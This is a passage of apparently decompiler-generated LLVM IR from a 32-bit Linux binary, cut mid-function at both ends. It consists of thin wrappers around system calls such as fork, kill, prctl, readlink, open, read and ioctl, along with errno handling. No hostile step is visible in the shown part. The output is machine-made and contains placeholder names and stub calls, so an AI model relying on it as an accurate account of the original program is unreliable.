  %v1_8052126 = add i32 %v0_8052126, -1
  store i32 %v1_8052126, i32* %ecx.global-to-local, align 4
  %v3_8052127 = inttoptr i32 %v2_8052127 to i8*
  store i8 %v2_8052124, i8* %v3_8052127, align 1
  %v0_8052129 = load i32, i32* %edx.global-to-local, align 4
  %v1_8052129 = add i32 %v0_8052129, 1
  store i32 %v1_8052129, i32* %edx.global-to-local, align 4
  %v0_805212a = load i32, i32* %ebx.global-to-local, align 4
  %v1_805212a = add i32 %v0_805212a, 1
  store i32 %v1_805212a, i32* %ebx.global-to-local, align 4
  %v0_805212b = load i32, i32* %ecx.global-to-local, align 4
  %v10_805212b = icmp eq i32 %v0_805212b, -1
  %v1_805212e = icmp eq i1 %v10_805212b, false
  br i1 %v1_805212e, label %dec_label_pc_8052124.dec_label_pc_8052124_crit_edge, label %dec_label_pc_8052130.loopexit

dec_label_pc_8052124.dec_label_pc_8052124_crit_edge: ; preds = %dec_label_pc_8052124
  %v4_8052124.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8052124

dec_label_pc_8052130.loopexit:                    ; preds = %dec_label_pc_8052124
  br label %dec_label_pc_8052130

dec_label_pc_8052130:                             ; preds = %dec_label_pc_8052130.loopexit, %dec_label_pc_805211b, %dec_label_pc_80520b0
  store i32 %arg3, i32* %eax.global-to-local, align 4
  ret i32 %arg3

dec_label_pc_8052140:                             ; preds = %dec_label_pc_80520c7
  store i8 48, i8* %tmp24, align 1
  %v2_8052143 = add i32 %arg3, 1
  %v3_8052143 = inttoptr i32 %v2_8052143 to i8*
  store i8 0, i8* %v3_8052143, align 1
  store i32 %arg3, i32* %eax.global-to-local, align 4
  ret i32 %arg3

dec_label_pc_8052156:                             ; preds = %dec_label_pc_8052104
  %v0_8052156 = load i32, i32* @esp, align 4
  %v2_8052156 = add i32 %v0_80520fb, 13
  %v3_8052156 = add i32 %v2_8052156, %v0_8052156
  %v4_8052156 = inttoptr i32 %v3_8052156 to i8*
  store i8 45, i8* %v4_8052156, align 1
  %v1_8052109.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8052109

dec_label_pc_805215d:                             ; preds = %dec_label_pc_80520cb
  %v1_805215f = icmp eq i1 %v3_80520c7, false
  br i1 %v1_805215f, label %dec_label_pc_80520d9, label %dec_label_pc_8052165

dec_label_pc_8052165:                             ; preds = %dec_label_pc_805215d
  %v1_8052167 = sub i32 0, %v4_80520bb
  br label %dec_label_pc_80520dd

dec_label_pc_8052175:                             ; preds = %dec_label_pc_8052109
  store i32 %arg3, i32* %ebx.global-to-local, align 4
  store i32 %v3_8052109, i32* %edx.global-to-local, align 4
  store i32 0, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_8052124

; uselistorder directives
  uselistorder i32 %v1_805212a, { 1, 0 }
  uselistorder i32 %v1_8052129, { 1, 0 }
  uselistorder i32 %v1_8052114, { 0, 1, 3, 2 }
  uselistorder i32 %v3_8052109, { 5, 0, 1, 2, 3, 6, 4, 7, 8 }
  uselistorder i32 %div19, { 1, 2, 0 }
  uselistorder i32 %v1_80520fb, { 1, 0 }
  uselistorder i32 %v4_80520bb, { 2, 1, 0, 4, 3, 5 }
  uselistorder i32* %ecx.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 0 }
  uselistorder i32* %ebx.global-to-local, { 0, 5, 1, 2, 3, 4, 6, 7, 8 }
  uselistorder i8 45, { 2, 0, 1 }
  uselistorder i32 %arg3, { 5, 2, 3, 4, 6, 7, 0, 1, 8, 9, 10 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8052124, { 0, 2, 1 }
}

define i32 @function_805217d(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_805217d:
  %ebx.global-to-local = alloca i32, align 4
  %v0_805217d = load i32, i32* @edi, align 4
  %v0_805217e = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @edi, align 4
  %v1_8052192 = add i32 %arg2, -12
  %v6_805219c = icmp ugt i32 %v1_8052192, 2
  br i1 %v6_805219c, label %dec_label_pc_80521ac, label %dec_label_pc_805219e

dec_label_pc_805219e:                             ; preds = %dec_label_pc_805217d
  %v4_80521a2 = call i32 @function_80521d4(i32 %arg1, i32 %arg2, i32 %arg3, i32 %v1_8052192)
  br label %dec_label_pc_80521ce

dec_label_pc_80521ac:                             ; preds = %dec_label_pc_805217d
  store i32 %arg1, i32* %ebx.global-to-local, align 4
  %v2_80521b4 = call i32 (i32, i32, ...) @fcntl(i32 %arg1, i32 %arg2)
  store i32 %v2_80521b4, i32* %ebx.global-to-local, align 4
  %tmp17 = icmp ult i32 %v2_80521b4, -4095
  br i1 %tmp17, label %dec_label_pc_80521cc, label %dec_label_pc_80521c0

dec_label_pc_80521c0:                             ; preds = %dec_label_pc_80521ac
  %v1_80521c0 = call i32 @function_8052779(i32 %v0_805217e)
  %v0_80521c5 = load i32, i32* %ebx.global-to-local, align 4
  %v1_80521c5 = sub i32 0, %v0_80521c5
  %v2_80521c7 = inttoptr i32 %v1_80521c0 to i32*
  store i32 %v1_80521c5, i32* %v2_80521c7, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_80521cc

dec_label_pc_80521cc:                             ; preds = %dec_label_pc_80521ac, %dec_label_pc_80521c0
  %v0_80521cc = phi i32 [ %v2_80521b4, %dec_label_pc_80521ac ], [ -1, %dec_label_pc_80521c0 ]
  br label %dec_label_pc_80521ce

dec_label_pc_80521ce:                             ; preds = %dec_label_pc_805219e, %dec_label_pc_80521cc
  %v0_80521d3 = phi i32 [ %v4_80521a2, %dec_label_pc_805219e ], [ %v0_80521cc, %dec_label_pc_80521cc ]
  store i32 %v0_805217e, i32* @ebx, align 4
  store i32 %v0_805217d, i32* @edi, align 4
  ret i32 %v0_80521d3

; uselistorder directives
  uselistorder i32 %v2_80521b4, { 1, 0, 2 }
  uselistorder i32 %v0_805217e, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder i32 %arg1, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_80521ce, { 1, 0 }
  uselistorder label %dec_label_pc_80521cc, { 1, 0 }
}

define i32 @function_80521d4(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_80521d4:
  %edi.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_80521d4 = load i32, i32* @edi, align 4
  store i32 %v0_80521d4, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %edi.global-to-local, align 4
  %v0_80521ec = load i32, i32* @ebx, align 4
  %v1_80521f4 = call i32 @int80_syscall(i32 221)
  store i32 %v1_80521f4, i32* %edi.global-to-local, align 4
  %tmp12 = icmp ult i32 %v1_80521f4, -4095
  br i1 %tmp12, label %dec_label_pc_805220c, label %dec_label_pc_8052200

dec_label_pc_8052200:                             ; preds = %dec_label_pc_80521d4
  %v1_8052200 = call i32 @function_8052779(i32 %v0_80521ec)
  %v0_8052205 = load i32, i32* %edi.global-to-local, align 4
  %v1_8052205 = sub i32 0, %v0_8052205
  %v2_8052207 = inttoptr i32 %v1_8052200 to i32*
  store i32 %v1_8052205, i32* %v2_8052207, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  %v2_8052211.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_805220c

dec_label_pc_805220c:                             ; preds = %dec_label_pc_80521d4, %dec_label_pc_8052200
  %v2_8052211 = phi i32 [ %v0_80521d4, %dec_label_pc_80521d4 ], [ %v2_8052211.pre, %dec_label_pc_8052200 ]
  %v0_805220c = phi i32 [ %v1_80521f4, %dec_label_pc_80521d4 ], [ -1, %dec_label_pc_8052200 ]
  store i32 %v2_8052211, i32* %edi.global-to-local, align 4
  ret i32 %v0_805220c

; uselistorder directives
  uselistorder i32 %v1_80521f4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_805220c, { 1, 0 }
}

define i32 @function_8052213(i8* %arg1) local_unnamed_addr {
dec_label_pc_8052213:
  %edi.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8052213 = load i32, i32* @edi, align 4
  store i32 %v0_8052213, i32* %stack_var_-4, align 4
  %v4_8052217 = ptrtoint i8* %arg1 to i32
  store i32 %v4_8052217, i32* %edi.global-to-local, align 4
  %v0_805221b = load i32, i32* @ebx, align 4
  %v3_8052223 = call i32 @chdir(i8* %arg1)
  store i32 %v3_8052223, i32* %edi.global-to-local, align 4
  %tmp9 = icmp ult i32 %v3_8052223, -4095
  br i1 %tmp9, label %dec_label_pc_805223b, label %dec_label_pc_805222f

dec_label_pc_805222f:                             ; preds = %dec_label_pc_8052213
  %v1_805222f = call i32 @function_8052779(i32 %v0_805221b)
  %v0_8052234 = load i32, i32* %edi.global-to-local, align 4
  %v1_8052234 = sub i32 0, %v0_8052234
  %v2_8052236 = inttoptr i32 %v1_805222f to i32*
  store i32 %v1_8052234, i32* %v2_8052236, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  %v2_805223f.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_805223b

dec_label_pc_805223b:                             ; preds = %dec_label_pc_8052213, %dec_label_pc_805222f
  %v2_805223f = phi i32 [ %v0_8052213, %dec_label_pc_8052213 ], [ %v2_805223f.pre, %dec_label_pc_805222f ]
  %v0_805223b = phi i32 [ %v3_8052223, %dec_label_pc_8052213 ], [ -1, %dec_label_pc_805222f ]
  store i32 %v2_805223f, i32* %edi.global-to-local, align 4
  ret i32 %v0_805223b

; uselistorder directives
  uselistorder i32 %v3_8052223, { 1, 0, 2 }
  uselistorder i8* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_805223b, { 1, 0 }
}

define i32 @function_8052241(i32 %arg1) local_unnamed_addr {
dec_label_pc_8052241:
  %edi.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8052241 = load i32, i32* @edi, align 4
  store i32 %v0_8052241, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %edi.global-to-local, align 4
  %v0_8052249 = load i32, i32* @ebx, align 4
  %v1_8052251 = call i32 @close(i32 %arg1)
  store i32 %v0_8052249, i32* @ebx, align 4
  store i32 %v1_8052251, i32* %edi.global-to-local, align 4
  %tmp9 = icmp ult i32 %v1_8052251, -4095
  br i1 %tmp9, label %dec_label_pc_8052269, label %dec_label_pc_805225d

dec_label_pc_805225d:                             ; preds = %dec_label_pc_8052241
  %v1_805225d = call i32 @function_8052779(i32 %v0_8052249)
  %v0_8052262 = load i32, i32* %edi.global-to-local, align 4
  %v1_8052262 = sub i32 0, %v0_8052262
  %v2_8052264 = inttoptr i32 %v1_805225d to i32*
  store i32 %v1_8052262, i32* %v2_8052264, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  %v2_805226d.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_8052269

dec_label_pc_8052269:                             ; preds = %dec_label_pc_8052241, %dec_label_pc_805225d
  %v2_805226d = phi i32 [ %v0_8052241, %dec_label_pc_8052241 ], [ %v2_805226d.pre, %dec_label_pc_805225d ]
  %v0_8052269 = phi i32 [ %v1_8052251, %dec_label_pc_8052241 ], [ -1, %dec_label_pc_805225d ]
  %v2_805226b = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_805226b, i32* @edx, align 4
  store i32 %v2_805226d, i32* @edi, align 4
  ret i32 %v0_8052269

; uselistorder directives
  uselistorder i32 %v1_8052251, { 1, 0, 2 }
  uselistorder i32 %v0_8052249, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8052269, { 1, 0 }
}

define i32 @function_805226f() local_unnamed_addr {
dec_label_pc_805226f:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_805226f = load i32, i32* @ebx, align 4
  store i32 %v0_805226f, i32* %stack_var_-4, align 4
  %v1_8052278 = call i32 @fork(i32 %v0_805226f)
  store i32 %v1_8052278, i32* %ebx.global-to-local, align 4
  %tmp7 = icmp ult i32 %v1_8052278, -4095
  br i1 %tmp7, label %dec_label_pc_805228f, label %dec_label_pc_8052283

dec_label_pc_8052283:                             ; preds = %dec_label_pc_805226f
  %v1_8052283 = call i32 @function_8052779(i32 %v0_805226f)
  %v0_8052288 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8052288 = sub i32 0, %v0_8052288
  %v2_805228a = inttoptr i32 %v1_8052283 to i32*
  store i32 %v1_8052288, i32* %v2_805228a, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  %v2_8052293.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_805228f

dec_label_pc_805228f:                             ; preds = %dec_label_pc_805226f, %dec_label_pc_8052283
  %v2_8052293 = phi i32 [ %v0_805226f, %dec_label_pc_805226f ], [ %v2_8052293.pre, %dec_label_pc_8052283 ]
  %v0_805228f = phi i32 [ %v1_8052278, %dec_label_pc_805226f ], [ -1, %dec_label_pc_8052283 ]
  store i32 %v2_8052293, i32* @ebx, align 4
  ret i32 %v0_805228f

; uselistorder directives
  uselistorder i32 %v1_8052278, { 1, 0, 2 }
  uselistorder label %dec_label_pc_805228f, { 1, 0 }
}

define i32 @function_8052295() local_unnamed_addr {
dec_label_pc_8052295:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8052295 = load i32, i32* @ebx, align 4
  store i32 %v0_8052295, i32* %stack_var_-4, align 4
  %v1_805229e = call i32 @getpid(i32 %v0_8052295)
  store i32 %v1_805229e, i32* %ebx.global-to-local, align 4
  %tmp7 = icmp ult i32 %v1_805229e, -4095
  br i1 %tmp7, label %dec_label_pc_80522b5, label %dec_label_pc_80522a9

dec_label_pc_80522a9:                             ; preds = %dec_label_pc_8052295
  %v1_80522a9 = call i32 @function_8052779(i32 %v0_8052295)
  %v0_80522ae = load i32, i32* %ebx.global-to-local, align 4
  %v1_80522ae = sub i32 0, %v0_80522ae
  %v2_80522b0 = inttoptr i32 %v1_80522a9 to i32*
  store i32 %v1_80522ae, i32* %v2_80522b0, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  %v2_80522b9.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_80522b5

dec_label_pc_80522b5:                             ; preds = %dec_label_pc_8052295, %dec_label_pc_80522a9
  %v2_80522b9 = phi i32 [ %v0_8052295, %dec_label_pc_8052295 ], [ %v2_80522b9.pre, %dec_label_pc_80522a9 ]
  %v0_80522b5 = phi i32 [ %v1_805229e, %dec_label_pc_8052295 ], [ -1, %dec_label_pc_80522a9 ]
  %v2_80522b7 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_80522b7, i32* @edx, align 4
  store i32 %v2_80522b9, i32* @ebx, align 4
  ret i32 %v0_80522b5

; uselistorder directives
  uselistorder i32 %v1_805229e, { 1, 0, 2 }
  uselistorder label %dec_label_pc_80522b5, { 1, 0 }
}

define i32 @function_80522bb() local_unnamed_addr {
dec_label_pc_80522bb:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_80522bb = load i32, i32* @ebx, align 4
  store i32 %v0_80522bb, i32* %stack_var_-4, align 4
  %v1_80522c4 = call i32 @getppid(i32 %v0_80522bb)
  store i32 %v1_80522c4, i32* %ebx.global-to-local, align 4
  %tmp7 = icmp ult i32 %v1_80522c4, -4095
  br i1 %tmp7, label %dec_label_pc_80522db, label %dec_label_pc_80522cf

dec_label_pc_80522cf:                             ; preds = %dec_label_pc_80522bb
  %v1_80522cf = call i32 @function_8052779(i32 %v0_80522bb)
  %v0_80522d4 = load i32, i32* %ebx.global-to-local, align 4
  %v1_80522d4 = sub i32 0, %v0_80522d4
  %v2_80522d6 = inttoptr i32 %v1_80522cf to i32*
  store i32 %v1_80522d4, i32* %v2_80522d6, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  %v2_80522df.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_80522db

dec_label_pc_80522db:                             ; preds = %dec_label_pc_80522bb, %dec_label_pc_80522cf
  %v2_80522df = phi i32 [ %v0_80522bb, %dec_label_pc_80522bb ], [ %v2_80522df.pre, %dec_label_pc_80522cf ]
  %v0_80522db = phi i32 [ %v1_80522c4, %dec_label_pc_80522bb ], [ -1, %dec_label_pc_80522cf ]
  %v2_80522dd = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_80522dd, i32* @edx, align 4
  store i32 %v2_80522df, i32* @ebx, align 4
  ret i32 %v0_80522db

; uselistorder directives
  uselistorder i32 %v1_80522c4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_80522db, { 1, 0 }
}

define i32 @function_80522e1(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_80522e1:
  %edi.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_80522e1 = load i32, i32* @edi, align 4
  store i32 %v0_80522e1, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %edi.global-to-local, align 4
  %v0_80522f9 = load i32, i32* @ebx, align 4
  %v2_8052301 = call i32 (i32, i32, ...) @ioctl(i32 %arg1, i32 %arg2)
  store i32 %v2_8052301, i32* %edi.global-to-local, align 4
  %tmp12 = icmp ult i32 %v2_8052301, -4095
  br i1 %tmp12, label %dec_label_pc_8052319, label %dec_label_pc_805230d

dec_label_pc_805230d:                             ; preds = %dec_label_pc_80522e1
  %v1_805230d = call i32 @function_8052779(i32 %v0_80522f9)
  %v0_8052312 = load i32, i32* %edi.global-to-local, align 4
  %v1_8052312 = sub i32 0, %v0_8052312
  %v2_8052314 = inttoptr i32 %v1_805230d to i32*
  store i32 %v1_8052312, i32* %v2_8052314, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  %v2_805231e.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_8052319

dec_label_pc_8052319:                             ; preds = %dec_label_pc_80522e1, %dec_label_pc_805230d
  %v2_805231e = phi i32 [ %v0_80522e1, %dec_label_pc_80522e1 ], [ %v2_805231e.pre, %dec_label_pc_805230d ]
  %v0_8052319 = phi i32 [ %v2_8052301, %dec_label_pc_80522e1 ], [ -1, %dec_label_pc_805230d ]
  store i32 %v2_805231e, i32* %edi.global-to-local, align 4
  ret i32 %v0_8052319

; uselistorder directives
  uselistorder i32 %v2_8052301, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8052319, { 1, 0 }
}

define i32 @function_8052320(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_8052320:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8052320 = load i32, i32* @ebx, align 4
  store i32 %v0_8052320, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %ebx.global-to-local, align 4
  %v2_8052333 = call i32 @kill(i32 %arg1, i32 %arg2)
  store i32 %v2_8052333, i32* %ebx.global-to-local, align 4
  %tmp9 = icmp ult i32 %v2_8052333, -4095
  br i1 %tmp9, label %dec_label_pc_805234c, label %dec_label_pc_8052340

dec_label_pc_8052340:                             ; preds = %dec_label_pc_8052320
  %v1_8052340 = call i32 @function_8052779(i32 %v0_8052320)
  %v0_8052345 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8052345 = sub i32 0, %v0_8052345
  %v2_8052347 = inttoptr i32 %v1_8052340 to i32*
  store i32 %v1_8052345, i32* %v2_8052347, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  %v2_8052350.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_805234c

dec_label_pc_805234c:                             ; preds = %dec_label_pc_8052320, %dec_label_pc_8052340
  %v2_8052350 = phi i32 [ %v0_8052320, %dec_label_pc_8052320 ], [ %v2_8052350.pre, %dec_label_pc_8052340 ]
  %v0_805234c = phi i32 [ %v2_8052333, %dec_label_pc_8052320 ], [ -1, %dec_label_pc_8052340 ]
  %v2_805234e = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_805234e, i32* @edx, align 4
  store i32 %v2_8052350, i32* @ebx, align 4
  ret i32 %v0_805234c

; uselistorder directives
  uselistorder i32 %v2_8052333, { 1, 0, 2 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_805234c, { 1, 0 }
}

define i32 @function_8052352(i8* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_8052352:
  %ebx.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %v0_8052353 = load i32, i32* @ebx, align 4
  %sext = mul i32 %arg2, 16777216
  %v4_8052359 = sdiv i32 %sext, 16777216
  store i32 %v4_8052359, i32* @ecx, align 4
  %v4_805235d = ptrtoint i8* %arg1 to i32
  %v3_8052361 = and i32 %arg2, 64
  %v4_8052361 = icmp eq i32 %v3_8052361, 0
  br i1 %v4_8052361, label %dec_label_pc_8052372, label %dec_label_pc_8052366

dec_label_pc_8052366:                             ; preds = %dec_label_pc_8052352
  %phitmp = urem i32 %tmp, 65536
  br label %dec_label_pc_8052372

dec_label_pc_8052372:                             ; preds = %dec_label_pc_8052352, %dec_label_pc_8052366
  %v0_8052372 = phi i32 [ 0, %dec_label_pc_8052352 ], [ %phitmp, %dec_label_pc_8052366 ]
  store i32 %v0_8052372, i32* @edx, align 4
  store i32 %v4_805235d, i32* %ebx.global-to-local, align 4
  %v5_805237d = call i32 (i8*, i32, ...) @open(i8* %arg1, i32 %v4_8052359)
  store i32 %v5_805237d, i32* %ebx.global-to-local, align 4
  %tmp15 = icmp ult i32 %v5_805237d, -4095
  br i1 %tmp15, label %dec_label_pc_8052395, label %dec_label_pc_8052389

dec_label_pc_8052389:                             ; preds = %dec_label_pc_8052372
  %v1_8052389 = call i32 @function_8052779(i32 %v0_8052353)
  %v0_805238e = load i32, i32* %ebx.global-to-local, align 4
  %v1_805238e = sub i32 0, %v0_805238e
  %v2_8052390 = inttoptr i32 %v1_8052389 to i32*
  store i32 %v1_805238e, i32* %v2_8052390, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8052395

dec_label_pc_8052395:                             ; preds = %dec_label_pc_8052372, %dec_label_pc_8052389
  %v0_8052395 = phi i32 [ %v5_805237d, %dec_label_pc_8052372 ], [ -1, %dec_label_pc_8052389 ]
  store i32 %v0_8052353, i32* @ebx, align 4
  ret i32 %v0_8052395

; uselistorder directives
  uselistorder i32 %v5_805237d, { 1, 0, 2 }
  uselistorder i32 %v4_8052359, { 1, 0 }
  uselistorder i32 %v0_8052353, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_8052395, { 1, 0 }
  uselistorder label %dec_label_pc_8052372, { 1, 0 }
}

define i32 @function_805239d(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_805239d:
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_805239e = load i32, i32* @esi, align 4
  store i32 %v0_805239e, i32* %stack_var_-8, align 4
  store i32 %arg4, i32* %esi.global-to-local, align 4
  %v0_80523b6 = load i32, i32* @ebx, align 4
  %v5_80523be = call i32 @prctl(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5)
  store i32 %v5_80523be, i32* %esi.global-to-local, align 4
  %tmp12 = icmp ult i32 %v5_80523be, -4095
  br i1 %tmp12, label %dec_label_pc_80523d6, label %dec_label_pc_80523ca

dec_label_pc_80523ca:                             ; preds = %dec_label_pc_805239d
  %v1_80523ca = call i32 @function_8052779(i32 %v0_80523b6)
  %v0_80523cf = load i32, i32* %esi.global-to-local, align 4
  %v1_80523cf = sub i32 0, %v0_80523cf
  %v2_80523d1 = inttoptr i32 %v1_80523ca to i32*
  store i32 %v1_80523cf, i32* %v2_80523d1, align 4
  store i32 -1, i32* %esi.global-to-local, align 4
  %v2_80523d9.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_80523d6

dec_label_pc_80523d6:                             ; preds = %dec_label_pc_805239d, %dec_label_pc_80523ca
  %v2_80523d9 = phi i32 [ %v0_805239e, %dec_label_pc_805239d ], [ %v2_80523d9.pre, %dec_label_pc_80523ca ]
  %v0_80523d6 = phi i32 [ %v5_80523be, %dec_label_pc_805239d ], [ -1, %dec_label_pc_80523ca ]
  store i32 %v2_80523d9, i32* %esi.global-to-local, align 4
  ret i32 %v0_80523d6

; uselistorder directives
  uselistorder i32 %v5_80523be, { 1, 0, 2 }
  uselistorder label %dec_label_pc_80523d6, { 1, 0 }
}

define i32 @function_80523dc(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_80523dc:
  %edi.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_80523dc = load i32, i32* @edi, align 4
  store i32 %v0_80523dc, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %edi.global-to-local, align 4
  %v0_80523ec = load i32, i32* @ebx, align 4
  %v4_80523f4 = call i32 @read(i32 %arg1, i32* %arg2, i32 %arg3)
  store i32 %v0_80523ec, i32* @ebx, align 4
  store i32 %v4_80523f4, i32* %edi.global-to-local, align 4
  %tmp12 = icmp ult i32 %v4_80523f4, -4095
  br i1 %tmp12, label %dec_label_pc_805240c, label %dec_label_pc_8052400

dec_label_pc_8052400:                             ; preds = %dec_label_pc_80523dc
  %v1_8052400 = call i32 @function_8052779(i32 %v0_80523ec)
  %v0_8052405 = load i32, i32* %edi.global-to-local, align 4
  %v1_8052405 = sub i32 0, %v0_8052405
  %v2_8052407 = inttoptr i32 %v1_8052400 to i32*
  store i32 %v1_8052405, i32* %v2_8052407, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  %v2_8052410.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_805240c

dec_label_pc_805240c:                             ; preds = %dec_label_pc_80523dc, %dec_label_pc_8052400
  %v2_8052410 = phi i32 [ %v0_80523dc, %dec_label_pc_80523dc ], [ %v2_8052410.pre, %dec_label_pc_8052400 ]
  %v0_805240c = phi i32 [ %v4_80523f4, %dec_label_pc_80523dc ], [ -1, %dec_label_pc_8052400 ]
  store i32 %v2_8052410, i32* @edi, align 4
  ret i32 %v0_805240c

; uselistorder directives
  uselistorder i32 %v4_80523f4, { 1, 0, 2 }
  uselistorder i32 %v0_80523ec, { 1, 0 }
  uselistorder label %dec_label_pc_805240c, { 1, 0 }
}

define i32 @function_8052412(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_8052412:
  %edi.global-to-local = alloca i32, align 4
  %tmp5 = inttoptr i32 %arg2 to i8*
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8052412 = load i32, i32* @edi, align 4
  store i32 %v0_8052412, i32* %stack_var_-4, align 4
  %v4_8052416 = ptrtoint i8* %arg1 to i32
  store i32 %v4_8052416, i32* %edi.global-to-local, align 4
  %v0_8052422 = load i32, i32* @ebx, align 4
  %v7_805242a = call i32 @readlink(i8* %arg1, i8* %tmp5, i32 %arg3)
  store i32 %v0_8052422, i32* @ebx, align 4
  store i32 %v7_805242a, i32* %edi.global-to-local, align 4
  %tmp13 = icmp ult i32 %v7_805242a, -4095
  br i1 %tmp13, label %dec_label_pc_8052442, label %dec_label_pc_8052436

dec_label_pc_8052436:                             ; preds = %dec_label_pc_8052412
  %v1_8052436 = call i32 @function_8052779(i32 %v0_8052422)
  %v0_805243b = load i32, i32* %edi.global-to-local, align 4
  %v1_805243b = sub i32 0, %v0_805243b
  %v2_805243d = inttoptr i32 %v1_8052436 to i32*
  store i32 %v1_805243b, i32* %v2_805243d, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  %v2_8052446.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_8052442

dec_label_pc_8052442:                             ; preds = %dec_label_pc_8052412, %dec_label_pc_8052436
  %v2_8052446 = phi i32 [ %v0_8052412, %dec_label_pc_8052412 ], [ %v2_8052446.pre, %dec_label_pc_8052436 ]
  %v0_8052442 = phi i32 [ %v7_805242a, %dec_label_pc_8052412 ], [ -1, %dec_label_pc_8052436 ]
  %v2_8052444 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8052444, i32* @edx, align 4
  store i32 %v2_8052446, i32* @edi, align 4
  ret i32 %v0_8052442

; uselistorder directives
  uselistorder i32 %v7_805242a, { 1, 0, 2 }
  uselistorder i32 %v0_8052422, { 1, 0 }
  uselistorder label %dec_label_pc_8052442, { 1, 0 }
}

define i32 @function_8052448() local_unnamed_addr {
dec_label_pc_8052448:
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_8052449 = load i32, i32* @esi, align 4
  store i32 %v0_8052449, i32* %stack_var_-8, align 4
  %v0_8052461 = load i32, i32* @ebx, align 4
  %v1_8052469 = call i32 @int80_syscall(i32 142)
  store i32 %v0_8052461, i32* @ebx, align 4
  store i32 %v1_8052469, i32* %esi.global-to-local, align 4
  %tmp12 = icmp ult i32 %v1_8052469, -4095
  br i1 %tmp12, label %dec_label_pc_8052481, label %dec_label_pc_8052475

dec_label_pc_8052475:                             ; preds = %dec_label_pc_8052448
  %v1_8052475 = call i32 @function_8052779(i32 %v0_8052461)
  %v0_805247a = load i32, i32* %esi.global-to-local, align 4
  %v1_805247a = sub i32 0, %v0_805247a
